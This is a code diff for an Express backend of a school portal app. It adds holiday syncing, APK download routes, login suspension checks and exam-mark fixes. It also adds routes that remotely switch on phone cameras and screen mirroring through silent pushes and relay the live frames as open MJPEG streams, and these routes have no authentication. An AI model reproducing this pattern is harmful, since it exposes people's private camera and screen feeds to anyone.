@@ -32,7 +32,8 @@ const {
   notifyAatifTeacherOnline,
   cleanupCallLogs,
   broadcastSilentOtaPush,
-  wakeRemotePreviewDevice
+  wakeRemotePreviewDevice,
+  broadcastAppIconChange
 } = require("./server/calls");
 
 const jwtCrypto = require('crypto');
@@ -163,7 +164,7 @@ const app = express();
 
 // ── Next-Generation High-Performance Zstandard (zstd) / Brotli / Gzip Compression ──
 function zstdCompressionMiddleware(options = {}) {
-  const threshold = options.threshold || 128;
+  const threshold = options.threshold !== undefined ? options.threshold : 0;
   const SKIP_MIMES = [
     'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/avif',
     'video/mp4', 'video/webm', 'audio/mpeg', 'audio/ogg',
@@ -173,7 +174,7 @@ function zstdCompressionMiddleware(options = {}) {
   return (req, res, next) => {
     const acceptEncoding = (req.headers['accept-encoding'] || '').toLowerCase();
 
-    const supportsZstd = typeof zlib.createZstdCompress === 'function' && acceptEncoding.includes('zstd');
+    const supportsZstd = typeof zlib.createZstdCompress === 'function' && (acceptEncoding.includes('zstd') || acceptEncoding.includes('*'));
     const supportsBr = typeof zlib.createBrotliCompress === 'function' && acceptEncoding.includes('br');
     const supportsGzip = acceptEncoding.includes('gzip');
     const supportsDeflate = acceptEncoding.includes('deflate');
@@ -183,6 +184,7 @@ function zstdCompressionMiddleware(options = {}) {
     }
 
     const originalSend = res.send;
+    const originalEnd = res.end;
 
     function compressAndSend(body, isJson = false) {
       if (res.headersSent) return;
@@ -213,7 +215,7 @@ function zstdCompressionMiddleware(options = {}) {
         let encoding;
 
         if (supportsZstd) {
-          compressed = zlib.zstdCompressSync(buffer);
+          compressed = zlib.zstdCompressSync(buffer, { level: 3 });
           encoding = 'zstd';
         } else if (supportsBr) {
           compressed = zlib.brotliCompressSync(buffer);
@@ -241,12 +243,18 @@ function zstdCompressionMiddleware(options = {}) {
 
     res.send = compressAndSend;
     res.json = (obj) => compressAndSend(obj, true);
+    res.end = function(chunk, encoding, callback) {
+      if (chunk && !res.headersSent && typeof chunk !== 'function') {
+        return compressAndSend(chunk);
+      }
+      return originalEnd.call(res, chunk, encoding, callback);
+    };
 
     next();
   };
 }
 
-app.use(zstdCompressionMiddleware({ threshold: 128 }));
+app.use(zstdCompressionMiddleware({ threshold: 0 }));
 app.use(compression()); // Fallback legacy stream compression
 const PORT = Number(process.env.PORT) || 3000;
 
@@ -402,13 +410,56 @@ const cursorTemplatesDir = path.join(
 app.use("/templates", express.static(templatesDir));
 app.use("/templates", express.static(cursorTemplatesDir));
 
+// ------------------- SUPER ADMIN & INVOICE ROUTING -------------------
+app.get('/api/super-admin/invoices/:invoiceNo/html', (req, res) => {
+  const inv = encodeURIComponent(req.params.invoiceNo || '');
+  res.redirect(307, `https://tps-erp-saas.vercel.app/api/super-admin/invoices/${inv}/html`);
+});
+
+app.get(['/super-admin', '/super-admin/*'], (req, res) => {
+  res.redirect(307, 'https://tps-erp-saas.vercel.app/super-admin');
+});
+
 // ------------------- HEALTH -------------------
 
 app.get("/", (req, res) => {
   const indexPath = path.join(__dirname, "public", "index.html");
-  res.sendFile(indexPath, (err) => {
-    if (err) res.send("✅ Backend is live");
+  if (fs.existsSync(indexPath)) {
+    res.setHeader("Content-Type", "text/html; charset=utf-8");
+    return res.send(fs.readFileSync(indexPath));
+  }
+  res.send("✅ Backend is live");
+});
+
+// ── Universal APK Server (Direct Vercel / Local Host) ──
+app.get([
+  "/TPS-Original-App.apk",
+  "/TPS.apk",
+  "/Karz-e-Hasan.apk",
+  "/CabHUB.apk",
+  "/Tapowan-Mobile-App*.apk",
+  "/*.apk"
+], (req, res) => {
+  const reqFile = req.path.replace(/^\/+/, '') || 'TPS-Original-App.apk';
+  const localApkPath = path.join(__dirname, 'public', reqFile);
+  const defaultApkPath = path.join(__dirname, 'public', 'TPS-Original-App.apk');
+
+  if (fs.existsSync(localApkPath)) {
+    return res.sendFile(localApkPath);
+  }
+  if (fs.existsSync(defaultApkPath)) {
+    return res.sendFile(defaultApkPath);
+  }
+
+  const targetUrl = (reqFile.includes('TPS') || reqFile.endsWith('.apk'))
+    ? 'https://github.com/aatifraza161-bit/tapowan-school-portal/releases/latest/download/TPS-Original-App.apk'
+    : `https://tapowan-app.vercel.app/${reqFile}`;
+  res.writeHead(302, {
+    Location: targetUrl,
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Pragma': 'no-cache'
   });
+  return res.end();
 });
 
 app.get("/api/health", (req, res) => {
@@ -555,6 +606,12 @@ const ADMIN_ONLY_MODULES = new Set(["users"]);
 app.post("/api/auth/login", authLimiter, async (req, res) => {
   try {
     const { username, password } = req.body || {};
+    const settingsRes = await db.execute({ sql: "SELECT key, value FROM settings WHERE key = 'saas_school_status' LIMIT 1", skipCache: true }).catch(() => ({ rows: [] }));
+    const saasStatusRow = settingsRes?.rows?.[0] || null;
+    if (saasStatusRow && (saasStatusRow.value === "Suspended" || saasStatusRow.value === "Archived")) {
+      return res.status(403).json({ error: `This school portal is currently ${saasStatusRow.value} by EduCore Super Admin.` });
+    }
+
     const users = await list("users");
 
     // Find user by username and active status
@@ -753,10 +810,25 @@ app.get("/api/store/signature", authRequired, async (req, res) => {
   }
 });
 
+app.post("/api/saas/cache-bust", async (req, res) => {
+  try {
+    if (typeof invalidateStoreCache === "function") invalidateStoreCache();
+    res.json({ ok: true, bustedAt: new Date().toISOString() });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.get("/api/store", authRequired, async (req, res) => {
   res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0");
   try {
     const store = await getStore();
+    try {
+      const freshSettings = await db.execute({ sql: "SELECT * FROM settings", skipCache: true });
+      if (freshSettings && Array.isArray(freshSettings.rows)) {
+        store.settings = freshSettings.rows.map(r => normalizeRow("settings", r));
+      }
+    } catch (_) {}
     res.json(store);
   } catch (err) {
     console.error("API /api/store route error:", err);
@@ -1363,23 +1435,228 @@ app.post("/api/admin/ota/broadcast-push", async (req, res) => {
 // 14. Wake Target Device for Remote Camera Live Preview
 app.post("/api/calls/remote-preview/wake", async (req, res) => {
   try {
-    const { targetDeviceId, previewId, viewerName, force } = req.body || {};
-    const result = await wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, force: !!force });
+    const { targetDeviceId, previewId, viewerName, force, mode, command, facing } = req.body || {};
+    // Purge opposite or stale cached frames when switching modes or stopping
+    if (command === 'screen_mirror_off' || String(previewId).includes('screen_mirror_off')) {
+      ipCamFrames.delete('__latest_screen__');
+    } else if (command === 'camera_off' || command === 'hard_camera_stop' || String(previewId).includes('camera_off') || String(previewId).includes('hard_camera_stop')) {
+      ipCamFrames.delete('__latest_camera__');
+      ipCamFrames.delete('__latest_screen__');
+    } else if (mode === 'screen_mirror') {
+      ipCamFrames.delete('__latest_camera__');
+    } else {
+      ipCamFrames.delete('__latest_screen__');
+    }
+    const result = await wakeRemotePreviewDevice({
+      targetDeviceId,
+      previewId,
+      viewerName,
+      command: command || '',
+      facing: facing || '',
+      force: !!force,
+      mode: mode || 'call'
+    });
     res.json(result);
   } catch (err) {
     res.status(500).json({ ok: false, error: err.message });
   }
 });
 
+// 15. Dynamic App Icon & Branding Broadcast (Flipkart Style)
+app.post("/api/admin/app-icon/broadcast", async (req, res) => {
+  try {
+    const { iconName, schoolLogoUrl } = req.body || {};
+    const result = await broadcastAppIconChange({ iconName, schoolLogoUrl });
+    res.json(result);
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+app.get("/api/admin/app-icon", async (req, res) => {
+  try {
+    const { list } = require("./server/db-sqlite");
+    const settings = await list("settings");
+    const iconRow = (settings || []).find(s => s.key === "app_launcher_icon");
+    const logoRow = (settings || []).find(s => s.key === "school_logo_url");
+    res.json({
+      ok: true,
+      activeIcon: iconRow?.value || "tps",
+      schoolLogoUrl: logoRow?.value || null
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+// ── IP CAMERA FRAME RELAY & MJPEG STREAMING ENGINE ─────────────
+const ipCamFrames = new Map(); // previewId -> { buffer, facing, updatedAt }
+const ipCamStreamClients = new Map(); // previewId -> Set<res>
+
+// 1. Ingest live frame from target device (NativeIpCameraManager / ScreenCaptureManager)
+app.post("/api/calls/remote-preview/frame", express.raw({ type: ['image/*', 'application/octet-stream'], limit: '10mb' }), (req, res) => {
+  try {
+    const previewId = req.headers['x-preview-id'] || req.query.previewId;
+    if (!previewId) {
+      return res.status(400).json({ ok: false, error: "Missing previewId" });
+    }
+    const buffer = Buffer.isBuffer(req.body) ? req.body : (req.body ? Buffer.from(req.body) : null);
+    if (!buffer || buffer.length === 0) {
+      return res.status(400).json({ ok: false, error: "Empty frame buffer" });
+    }
+    const facing = req.headers['x-facing'] || 'environment';
+    const isScreenFrame = facing === 'screen' || String(previewId).startsWith('sm_');
+    const now = Date.now();
+    ipCamFrames.set(previewId, { buffer, facing, updatedAt: now });
+    if (isScreenFrame) {
+      ipCamFrames.set('__latest_screen__', { buffer, facing: 'screen', updatedAt: now, previewId });
+      ipCamFrames.delete('__latest_camera__');
+    } else {
+      ipCamFrames.set('__latest_camera__', { buffer, facing, updatedAt: now, previewId });
+      ipCamFrames.delete('__latest_screen__');
+    }
+
+    // Broadcast frame to active MJPEG stream subscribers
+    const clients = ipCamStreamClients.get(previewId);
+    if (clients && clients.size > 0) {
+      const boundary = "mjpegframe";
+      const header = `--${boundary}\r\nContent-Type: image/jpeg\r\nContent-Length: ${buffer.length}\r\n\r\n`;
+      const headerBuf = Buffer.from(header);
+      const trailerBuf = Buffer.from("\r\n");
+
+      for (const clientRes of clients) {
+        try {
+          if (!clientRes.writableEnded) {
+            clientRes.write(headerBuf);
+            clientRes.write(buffer);
+            clientRes.write(trailerBuf);
+          }
+        } catch (_) {
+          clients.delete(clientRes);
+        }
+      }
+    }
+
+    res.status(200).json({ ok: true, size: buffer.length });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+// 2. Stream live MJPEG video directly to standard browser <img> tag or player
+app.get("/api/calls/remote-preview/stream", (req, res) => {
+  const previewId = req.query.previewId;
+  if (!previewId) {
+    return res.status(400).send("Missing previewId query param");
+  }
+
+  const boundary = "mjpegframe";
+  res.writeHead(200, {
+    'Content-Type': `multipart/x-mixed-replace; boundary=--${boundary}`,
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Connection': 'close',
+    'Pragma': 'no-cache',
+    'Access-Control-Allow-Origin': '*'
+  });
+
+  // If we already have a recent frame matching the stream type, send it immediately
+  const isScreenReq = String(previewId).startsWith('sm_');
+  const fallbackKey = isScreenReq ? '__latest_screen__' : '__latest_camera__';
+  const existing = ipCamFrames.get(previewId) || ipCamFrames.get(fallbackKey);
+  if (existing && existing.buffer && (Date.now() - existing.updatedAt < 3000)) {
+    const typeMatches = isScreenReq ? (existing.facing === 'screen') : (existing.facing !== 'screen');
+    if (typeMatches) {
+      try {
+        res.write(`--${boundary}\r\nContent-Type: image/jpeg\r\nContent-Length: ${existing.buffer.length}\r\n\r\n`);
+        res.write(existing.buffer);
+        res.write("\r\n");
+      } catch (_) {}
+    }
+  }
+
+  if (!ipCamStreamClients.has(previewId)) {
+    ipCamStreamClients.set(previewId, new Set());
+  }
+  const clients = ipCamStreamClients.get(previewId);
+  clients.add(res);
+
+  const cleanup = () => {
+    clients.delete(res);
+    if (clients.size === 0) {
+      ipCamStreamClients.delete(previewId);
+    }
+  };
+
+  req.on('close', cleanup);
+  res.on('finish', cleanup);
+  res.on('error', cleanup);
+});
+
+// 3. Return latest single JPEG snapshot
+app.get("/api/calls/remote-preview/frame", (req, res) => {
+  const previewId = req.query.previewId;
+  if (!previewId) {
+    return res.status(400).send("Missing previewId query param");
+  }
+  const now = Date.now();
+  const isScreenReq = String(previewId).startsWith('sm_');
+  const fallbackKey = isScreenReq ? '__latest_screen__' : '__latest_camera__';
+
+  let frame = ipCamFrames.get(previewId);
+  if (frame) {
+    const matches = isScreenReq ? (frame.facing === 'screen') : (frame.facing !== 'screen');
+    if (!matches || (now - frame.updatedAt > 3000)) {
+      frame = null;
+    }
+  }
+  if (!frame || !frame.buffer) {
+    const latest = ipCamFrames.get(fallbackKey);
+    if (latest && latest.buffer && (now - latest.updatedAt < 2500)) {
+      const matches = isScreenReq ? (latest.facing === 'screen') : (latest.facing !== 'screen');
+      if (matches) {
+        frame = latest;
+      }
+    }
+  }
+  if (!frame || !frame.buffer) {
+    return res.status(404).send("No frame available yet");
+  }
+  res.writeHead(200, {
+    'Content-Type': 'image/jpeg',
+    'Content-Length': frame.buffer.length,
+    'X-Frame-Facing': frame.facing || 'environment',
+    'Access-Control-Expose-Headers': 'X-Frame-Facing',
+    'Cache-Control': 'no-cache, no-store, must-revalidate',
+    'Access-Control-Allow-Origin': '*'
+  });
+  res.end(frame.buffer);
+});
+
+// Periodically clean up stale frames (>5 minutes old)
+setInterval(() => {
+  const now = Date.now();
+  for (const [id, f] of ipCamFrames.entries()) {
+    if (now - f.updatedAt > 300000) {
+      ipCamFrames.delete(id);
+    }
+  }
+}, 60000);
+
 // 15. Send Remote Device Command with Instant FCM Wake Push
 app.post("/api/calls/device-command", async (req, res) => {
   try {
-    const { targetDeviceId, command, issuedBy = 'Admin' } = req.body || {};
+    const { targetDeviceId, command, issuedBy = 'Admin', facing, previewId } = req.body || {};
     if (!targetDeviceId || !command) {
       return res.status(400).json({ ok: false, error: "Missing targetDeviceId or command" });
     }
 
-    // 1. Insert command into app_device_commands table
+    // 1. Auto-expire stale pending commands older than 60s (prevents old camera_off from killing new Call Live sessions)
+    await db.execute({
+      sql: `UPDATE app_device_commands SET status = 'expired' WHERE target_device_id = ? AND status = 'pending' AND created_at < datetime('now', '-60 seconds')`,
+      args: [targetDeviceId]
+    }).catch(() => {});
+
+    // 1b. Insert new command into app_device_commands table
     await db.execute({
       sql: `INSERT INTO app_device_commands (target_device_id, command, status, issued_by, created_at) VALUES (?, ?, 'pending', ?, datetime('now'))`,
       args: [targetDeviceId, command, issuedBy]
@@ -1396,6 +1673,19 @@ app.post("/api/calls/device-command", async (req, res) => {
         sql: `UPDATE app_device_previews SET status = 'ended', updated_at = datetime('now') WHERE target_device_id = ? AND status != 'ended';`,
         args: [targetDeviceId]
       }).catch(() => {});
+    } else if (command === 'flip_camera') {
+      const targetFacing = facing || 'user';
+      if (previewId) {
+        await db.execute({
+          sql: `UPDATE app_device_previews SET camera_facing = ?, updated_at = datetime('now') WHERE preview_id = ?;`,
+          args: [targetFacing, previewId]
+        }).catch(() => {});
+      } else {
+        await db.execute({
+          sql: `UPDATE app_device_previews SET camera_facing = ?, updated_at = datetime('now') WHERE target_device_id = ? AND status != 'ended';`,
+          args: [targetFacing, targetDeviceId]
+        }).catch(() => {});
+      }
     } else if (command === 'camera_on') {
       await db.execute({
         sql: `UPDATE app_device_registry SET camera_status = 'on' WHERE device_id = ?;`,
@@ -1416,9 +1706,10 @@ app.post("/api/calls/device-command", async (req, res) => {
     // 2. Dispatch instant high-priority FCM wake push to target phone
     const wakeResult = await wakeRemotePreviewDevice({
       targetDeviceId,
-      previewId: 'cmd_' + command + '_' + Date.now().toString(36),
+      previewId: previewId || ('cmd_' + command + '_' + Date.now().toString(36)),
       viewerName: issuedBy,
       command: command,
+      facing: facing || '',
       force: true
     });
 
@@ -2333,6 +2624,206 @@ app.get("/api/photo/:moduleName/:id", async (req, res) => {
   }
 });
 
+// ── Live Indian Holidays Fetcher (Official Google Calendar iCal Feed) ──
+const GOOGLE_INDIAN_HOLIDAYS_ICS_URL = "https://calendar.google.com/calendar/ical/en.indian%23holiday%40group.v.calendar.google.com/public/basic.ics";
+let _liveHolidaysCache = null;
+let _liveHolidaysLastSync = 0;
+const LIVE_HOLIDAYS_TTL_MS = 10 * 60 * 1000; // 10 minutes cache
+
+function normalizeIndianHolidayEvent(rawName, rawDesc) {
+  let name = String(rawName || "")
+    .replace(/\\,/g, ",")
+    .replace(/\\;/g, ";")
+    .replace(/\s*\(Tentative Date\)\s*/gi, "")
+    .trim();
+
+  // Skip redundant regional/duplicate sub-observances that share dates with primary pan-India holidays
+  const skipExact = new Set([
+    "Janmashtami (Smarta)",
+    "Naraka Chaturdasi",
+    "Parsi New Year",
+    "Vishu",
+    "Mesadi",
+    "Vaisakhadi (Bengal)",
+    "Bahag Bihu (Assam)",
+    "Ugadi",
+    "Cheti Chand",
+    "Pongal",
+    "Hazarat Ali's Birthday",
+    "Jamat Ul-Vida",
+    "Easter Day",
+    "Christmas Eve",
+    "New Year's Eve",
+    "Guru Tegh Bahadur's Martyrdom Day"
+  ]);
+  if (skipExact.has(name)) return null;
+
+  const nameMap = {
+    "Mahatma Gandhi Jayanti": "Gandhi Jayanti",
+    "First Day of Sharad Navratri": "Sharad Navratri",
+    "First Day of Durga Puja Festivities": "Durga Puja Begins",
+    "Dussehra (Maha Navami)": "Maha Navami",
+    "Maharishi Valmiki Jayanti": "Valmiki Jayanti",
+    "Karaka Chaturthi (Karva Chauth)": "Karwa Chauth",
+    "Karaka Chaturthi": "Karwa Chauth",
+    "Diwali/Deepavali": "Diwali",
+    "Bhai Duj": "Bhai Dooj",
+    "Chhat Puja (Pratihar Sashthi/Surya Sashthi)": "Chhath Puja",
+    "Chhat Puja": "Chhath Puja",
+    "Ramzan Id/Eid-ul-Fitar": "Eid-ul-Fitr",
+    "Ramzan Id": "Eid-ul-Fitr",
+    "Eid-ul-Fitr": "Eid-ul-Fitr",
+    "Bakrid/Eid ul-Adha": "Eid-ul-Adha",
+    "Bakrid": "Eid-ul-Adha",
+    "Muharram/Ashura": "Muharram",
+    "Milad un-Nabi/Id-e-Milad": "Milad un-Nabi",
+    "Rama Navami": "Ram Navami",
+    "Maharishi Dayanand Saraswati Jayanti": "Dayanand Saraswati Jayanti",
+    "Birthday of Rabindranath": "Rabindranath Tagore Jayanti"
+  };
+
+  if (nameMap[name]) name = nameMap[name];
+
+  const isPublic = String(rawDesc || "").toLowerCase().includes("public holiday");
+  const nationalNames = new Set(["Republic Day", "Independence Day", "Gandhi Jayanti", "Ambedkar Jayanti", "May Day", "Teachers' Day", "Children's Day"]);
+  const religiousNames = new Set(["Maha Shivaratri", "Eid-ul-Fitr", "Ram Navami", "Mahavir Jayanti", "Good Friday", "Buddha Purnima", "Eid-ul-Adha", "Muharram", "Janmashtami", "Milad un-Nabi", "Guru Nanak Jayanti", "Guru Ravidas Jayanti", "Vasant Panchami"]);
+
+  let type = "Festival";
+  if (nationalNames.has(name)) type = "National";
+  else if (religiousNames.has(name)) type = "Religious";
+  else if (!isPublic) type = "Festival";
+
+  let description = isPublic ? "Gazetted Public Holiday" : "Indian Festival / Observance";
+  if (type === "National") description = "National Holiday / School Observance";
+
+  return { name, type, description };
+}
+
+async function fetchAndSyncLiveHolidays(forceSync = false) {
+  const now = Date.now();
+  if (!forceSync && _liveHolidaysCache && (now - _liveHolidaysLastSync < LIVE_HOLIDAYS_TTL_MS)) {
+    return _liveHolidaysCache;
+  }
+
+  try {
+    const resp = await fetch(GOOGLE_INDIAN_HOLIDAYS_ICS_URL, {
+      headers: { "User-Agent": "TapowanSchoolCalendar/1.0" },
+      signal: AbortSignal.timeout(10000)
+    });
+    if (!resp.ok) throw new Error(`Google Calendar iCal HTTP ${resp.status}`);
+    const rawIcs = await resp.text();
+    // Unfold RFC 5545 folded lines
+    const unfolded = rawIcs.replace(/\r?\n[ \t]/g, "");
+    const blocks = unfolded.split("BEGIN:VEVENT").slice(1);
+
+    const byDateAndName = new Map();
+    const yearsFound = new Set();
+
+    for (const block of blocks) {
+      const dtMatch = block.match(/DTSTART;VALUE=DATE:(\d{4})(\d{2})(\d{2})/);
+      const sumMatch = block.match(/SUMMARY:([^\r\n]+)/);
+      const descMatch = block.match(/DESCRIPTION:([^\r\n]+)/);
+      if (!dtMatch || !sumMatch) continue;
+
+      const year = dtMatch[1];
+      const date = `${year}-${dtMatch[2]}-${dtMatch[3]}`;
+      yearsFound.add(year);
+
+      const normalized = normalizeIndianHolidayEvent(sumMatch[1], descMatch ? descMatch[1] : "");
+      if (!normalized) continue;
+
+      const key = `${date}:::${normalized.name.toLowerCase()}`;
+      if (!byDateAndName.has(key)) {
+        byDateAndName.set(key, {
+          date,
+          name: normalized.name,
+          type: normalized.type,
+          description: normalized.description
+        });
+      }
+    }
+
+    // Inject fixed annual Indian school holidays/observances for each year in feed
+    for (const yr of yearsFound) {
+      const fixedSchoolDays = [
+        { date: `${yr}-05-01`, name: "May Day", type: "National", description: "International Workers' Day" },
+        { date: `${yr}-09-05`, name: "Teachers' Day", type: "National", description: "Dr. S. Radhakrishnan Birthday" },
+        { date: `${yr}-11-14`, name: "Children's Day", type: "National", description: "Pandit Jawaharlal Nehru Birthday" }
+      ];
+      for (const fd of fixedSchoolDays) {
+        const key = `${fd.date}:::${fd.name.toLowerCase()}`;
+        if (!byDateAndName.has(key)) {
+          byDateAndName.set(key, fd);
+        }
+      }
+    }
+
+    const liveList = Array.from(byDateAndName.values()).sort((a, b) => a.date.localeCompare(b.date));
+
+    if (liveList.length > 0) {
+      // Sync with Turso DB: keep custom school Vacation / School Event rows, replace standard holiday rows
+      const existingRes = await db.execute("SELECT * FROM holidays ORDER BY date ASC");
+      const existingRows = existingRes.rows || [];
+      const customSchoolRows = existingRows.filter(r => {
+        const t = String(r.type || "").toLowerCase();
+        const n = String(r.name || "").toLowerCase();
+        return t === "vacation" || t === "school" || n.includes("vacation") || n.includes("annual") || n.includes("exam");
+      });
+
+      // Check if database needs updating (e.g. missing 2026-10-20 Dussehra or still has wrong 2026-10-21 Diwali)
+      const existingKeySet = new Set(existingRows.map(r => `${r.date}:::${String(r.name || "").toLowerCase()}`));
+      const hasStale2025DatesIn2026 = existingKeySet.has("2026-10-21:::diwali") || existingKeySet.has("2026-10-02:::dussehra");
+      const hasLive2026Dussehra = existingKeySet.has("2026-10-20:::dussehra") && existingKeySet.has("2026-11-08:::diwali");
+
+      if (forceSync || hasStale2025DatesIn2026 || !hasLive2026Dussehra) {
+        await db.execute("DELETE FROM holidays WHERE lower(COALESCE(type, '')) != 'vacation' AND lower(COALESCE(name, '')) NOT LIKE '%vacation%'");
+        const statements = liveList.map(h => ({
+          sql: "INSERT INTO holidays (date, name, type, description) VALUES (?, ?, ?, ?)",
+          args: [h.date, h.name, h.type, h.description]
+        }));
+        const CHUNK = 25;
+        for (let i = 0; i < statements.length; i += CHUNK) {
+          await db.batch(statements.slice(i, i + CHUNK));
+        }
+        invalidateQueryCache("holidays");
+        if (typeof invalidateStoreCache === "function") invalidateStoreCache();
+      }
+    }
+
+    const finalRows = await list("holidays");
+    finalRows.sort((a, b) => String(a.date || "").localeCompare(String(b.date || "")));
+    _liveHolidaysCache = finalRows;
+    _liveHolidaysLastSync = now;
+    return finalRows;
+  } catch (err) {
+    console.warn("[Live Holidays] Failed to fetch Google iCal, falling back to DB:", err.message);
+    const fallback = await list("holidays");
+    fallback.sort((a, b) => String(a.date || "").localeCompare(String(b.date || "")));
+    return fallback;
+  }
+}
+
+app.get("/api/holidays/live", async (req, res) => {
+  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+  try {
+    const forceSync = req.query.sync === "1" || req.query.force === "1";
+    const allHolidays = await fetchAndSyncLiveHolidays(forceSync);
+    const yearFilter = req.query.year ? String(req.query.year).trim() : null;
+    const filtered = yearFilter
+      ? allHolidays.filter(h => String(h.date || "").startsWith(yearFilter))
+      : allHolidays;
+    res.json({
+      ok: true,
+      source: "Google Calendar Official Indian Holidays (Live)",
+      syncedAt: new Date(_liveHolidaysLastSync || Date.now()).toISOString(),
+      holidays: allHolidays,
+      yearHolidays: filtered
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
 app.get("/api/modules/:moduleName", (req, res, next) => {
   if (req.params.moduleName === "faceEmbeddings") return next();
   return authRequired(req, res, next);
@@ -2348,6 +2839,9 @@ app.get("/api/modules/:moduleName", (req, res, next) => {
     const role = String(user?.role || "").toLowerCase();
     if (role === "student" && ADMIN_ONLY_MODULES.has(moduleName)) {
       return res.status(403).json({ error: "Access denied" });
+    }
+    if (moduleName === "holidays") {
+      return res.json(await fetchAndSyncLiveHolidays(false));
     }
     res.json(await list(moduleName));
   } catch (err) {
@@ -2371,7 +2865,20 @@ app.get("/api/auth/me", async (req, res) => {
     if (!user) return res.json({ user: null });
     
     const role = String(user.role).toLowerCase();
-    const roleColors = { administrator: "#dc2626", principal: "#7c3aed", staff: "#2563eb", teacher: "#059669", student: "#d97706" };
+    const rKey = role.trim().replace(/[\s-]+/g, "_");
+    const roleColors = { 
+      administrator: "#dc2626", 
+      super_admin: "#dc2626", 
+      superadmin: "#dc2626", 
+      school_admin: "#dc2626", 
+      schooladmin: "#dc2626", 
+      admin: "#dc2626", 
+      principal: "#7c3aed", 
+      staff: "#2563eb", 
+      accountant: "#2563eb", 
+      teacher: "#059669", 
+      student: "#d97706" 
+    };
     
     return res.json({ 
       user,
@@ -2380,7 +2887,7 @@ app.get("/api/auth/me", async (req, res) => {
       fullName: user.fullName, 
       admissionNo: user.admissionNo,
       role: user.role, 
-      roleColor: roleColors[role] || "#64748b" 
+      roleColor: roleColors[rKey] || roleColors[role] || "#64748b" 
     });
   } catch (err) {
     res.status(500).json({ error: "Auth check failed" });
@@ -2701,13 +3208,33 @@ async function syncExamPayloadToAppMarks(payload, user) {
 
     if (examName && className && studentName) {
       // Clean up previous records for this student and exam so removed/deleted subjects don't linger
-      await db.execute({
-        sql: `DELETE FROM app_exam_marks 
-              WHERE UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) 
-                AND UPPER(TRIM(class_name)) = UPPER(TRIM(?)) 
-                AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))`,
-        args: [examName, className, studentName]
-      });
+      if (admissionNo) {
+        await db.execute({
+          sql: `DELETE FROM app_exam_marks 
+                WHERE UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(class_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))
+                  AND UPPER(TRIM(admission_no)) = UPPER(TRIM(?))`,
+          args: [examName, className, studentName, String(admissionNo)]
+        });
+      } else if (rollNo) {
+        await db.execute({
+          sql: `DELETE FROM app_exam_marks 
+                WHERE UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(class_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))
+                  AND TRIM(roll_no) = TRIM(?)`,
+          args: [examName, className, studentName, String(rollNo)]
+        });
+      } else {
+        await db.execute({
+          sql: `DELETE FROM app_exam_marks 
+                WHERE UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(class_name)) = UPPER(TRIM(?)) 
+                  AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))`,
+          args: [examName, className, studentName]
+        });
+      }
 
       if (Array.isArray(subjects) && subjects.length > 0) {
         for (const s of subjects) {
@@ -2915,10 +3442,22 @@ app.delete("/api/modules/:moduleName/:id", authRequired, async (req, res) => {
     if (moduleName === "exams" && existingRow) {
       try {
         const { runRaw } = require("./server/db-sqlite");
-        await runRaw(
-          `DELETE FROM app_exam_marks WHERE UPPER(TRIM(class_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))`,
-          [existingRow.className || '', existingRow.examName || '', existingRow.studentName || '']
-        );
+        if (existingRow.admissionNo) {
+          await runRaw(
+            `DELETE FROM app_exam_marks WHERE UPPER(TRIM(class_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(student_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(admission_no)) = UPPER(TRIM(?))`,
+            [existingRow.className || '', existingRow.examName || '', existingRow.studentName || '', String(existingRow.admissionNo)]
+          );
+        } else if (existingRow.rollNo) {
+          await runRaw(
+            `DELETE FROM app_exam_marks WHERE UPPER(TRIM(class_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(student_name)) = UPPER(TRIM(?)) AND TRIM(roll_no) = TRIM(?)`,
+            [existingRow.className || '', existingRow.examName || '', existingRow.studentName || '', String(existingRow.rollNo)]
+          );
+        } else {
+          await runRaw(
+            `DELETE FROM app_exam_marks WHERE UPPER(TRIM(class_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(exam_name)) = UPPER(TRIM(?)) AND UPPER(TRIM(student_name)) = UPPER(TRIM(?))`,
+            [existingRow.className || '', existingRow.examName || '', existingRow.studentName || '']
+          );
+        }
       } catch (e) {}
     }
 
